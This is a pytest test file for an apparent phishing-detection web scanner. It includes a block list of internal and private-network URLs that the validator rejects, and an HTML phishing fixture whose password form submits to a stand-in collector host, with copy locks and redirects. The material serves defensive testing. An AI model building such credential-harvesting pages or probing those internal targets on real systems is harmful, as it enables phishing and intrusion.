import pytest
from fastapi.testclient import TestClient

from analyzer import PageContentParser, UnsafeTargetError, normalize_and_filter_links, validate_target_url
from gemini_client import generate_fallback_analysis, risk_level_for_score, sanitize_ai_result
import main

def test_validate_target_url_normalizes_scheme():
    assert validate_target_url("Example.com/path?x=1") == "https://example.com/path?x=1"

@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
        "http://[::1]/",
        "ftp://example.com/",
        "https://user:pass@example.com/",
        "https://example.com:8080/",
    ],
)
def test_validate_target_url_rejects_unsafe_targets(url):
    with pytest.raises(UnsafeTargetError):
        validate_target_url(url)

def test_normalize_and_filter_links_keeps_same_site_html():
    links = normalize_and_filter_links(
        ["/login", "https://example.com/about#team", "https://evil.example/login", "/app.js"],
        "https://example.com/",
        "example.com",
    )
    assert "https://example.com/login" in links
    assert "https://example.com/about" in links
    assert all("evil.example" not in link for link in links)
    assert all(not link.endswith(".js") for link in links)

def test_page_parser_detects_sensitive_signals():
    parser = PageContentParser()
    parser.feed(
        """
        <html><head><title>Sign in</title></head>
        <body oncopy="return false">
        <h1>Verify account</h1>
        <form action="https://collector.example/submit"><input type="password" name="password"></form>
        <script>window.location.replace('/next')</script>
        <meta http-equiv="refresh" content="0; url=https://example.org">
        </body></html>
        """
    )
    assert parser.title == "Sign in"
    assert parser.headings == ["Verify account"]
    assert parser.inputs[0]["type"] == "password"
    assert parser.copy_paste_locks_detected is True
    assert parser.js_redirect_detected is True
    assert parser.redirects == ["https://example.org"]

def test_risk_mapping():
    assert risk_level_for_score(100) == "Safe"
    assert risk_level_for_score(80) == "Low Risk"
    assert risk_level_for_score(60) == "Medium Risk"
    assert risk_level_for_score(30) == "High Risk"
    assert risk_level_for_score(10) == "Critical"

def test_fallback_analysis_is_bounded_and_structured():
    result = generate_fallback_analysis(
        {
            "domain": "paypa1-update.example",
            "https_enabled": False,
            "is_reachable": True,
            "domain_age_days": 12,
            "registrar": "Example Registrar",
            "suspicious_patterns": ["Brand lookalike/impersonation detected"],
            "base_trust_score": 20,
            "crawled_page_content": {
                "has_password_field": True,
                "has_card_field": False,
                "external_scripts": ["https://cdn.example/script.js"],
            },
        }
    )
    assert 0 <= result["trust_score"] <= 100
    assert result["risk_level"] == "Critical"
    assert len(result["recommendations"]) >= 2
    assert 3 <= len(result["consequences"]) <= 5

def test_ai_result_cannot_override_baseline_too_far():
    result = sanitize_ai_result(
        {
            "trust_score": 99,
            "risk_level": "Safe",
            "ghost_summary": "मैंने इस वेबसाइट को एक्सप्लोर किया है। परीक्षण।",
            "ghost_summary_en": "I explored this website before you. Test.",
            "ai_explanation": "Test.",
            "recommendations": ["One", "Two"],
            "consequences": [
                {"step": "1", "description": "A", "risk": "Safe"},
                {"step": "2", "description": "B", "risk": "Warning"},
                {"step": "3", "description": "C", "risk": "Danger"},
            ],
            "threat_assessment": {},
        },
        50,
    )
    assert result["trust_score"] == 60
    assert result["risk_level"] == "Medium Risk"

@pytest.mark.asyncio
async def test_scan_endpoint(monkeypatch):
    analysis = {
        "url": "https://example.com/",
        "domain": "example.com",
        "https_enabled": True,
        "is_reachable": True,
        "domain_age_days": 1000,
        "registrar": "Example Registrar",
        "suspicious_patterns": [],
        "base_trust_score": 88,
        "crawled_page_content": {
            "title": "Example",
            "headings": [],
            "has_password_field": False,
            "has_card_field": False,
            "forms_count": 0,
            "input_fields": [],
            "external_scripts": [],
            "text_snippet": "",
            "subpages_scanned": [],
            "favicon": "",
            "metadata": {},
            "iframes_count": 0,
            "copy_paste_locks_detected": False,
            "inline_scripts_count": 0,
            "inline_scripts_length": 0,
        },
        "scorecard": {},
    }

    async def fake_analyze_url(_):
        return analysis

    async def fake_ai(_):
        return {
            "trust_score": 90,
            "risk_level": "Safe",
            "ghost_summary": "मैंने इस वेबसाइट को एक्सप्लोर किया है। परीक्षण।",
            "ghost_summary_en": "I explored this website before you. Test.",
            "ai_explanation": "Test.",
            "recommendations": ["One", "Two"],
            "consequences": [
                {"step": "1", "description": "A", "risk": "Safe"},
                {"step": "2", "description": "B", "risk": "Safe"},
                {"step": "3", "description": "C", "risk": "Safe"},
            ],
            "threat_assessment": {},
        }

    monkeypatch.setattr(main, "analyze_url", fake_analyze_url)
    monkeypatch.setattr(main, "get_ai_explanation", fake_ai)
    monkeypatch.setattr(main, "supabase_client", None)
    main.in_memory_scans.clear()

    with TestClient(main.app) as client:
        response = client.post("/api/scan", json={"url": "https://example.com/"})

    assert response.status_code == 200
    payload = response.json()
    assert payload["trust_score"] == 90
    assert payload["domain"] == "example.com"
    assert len(payload["consequences"]) == 3

def test_health_endpoint():
    with TestClient(main.app) as client:
        response = client.get("/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"
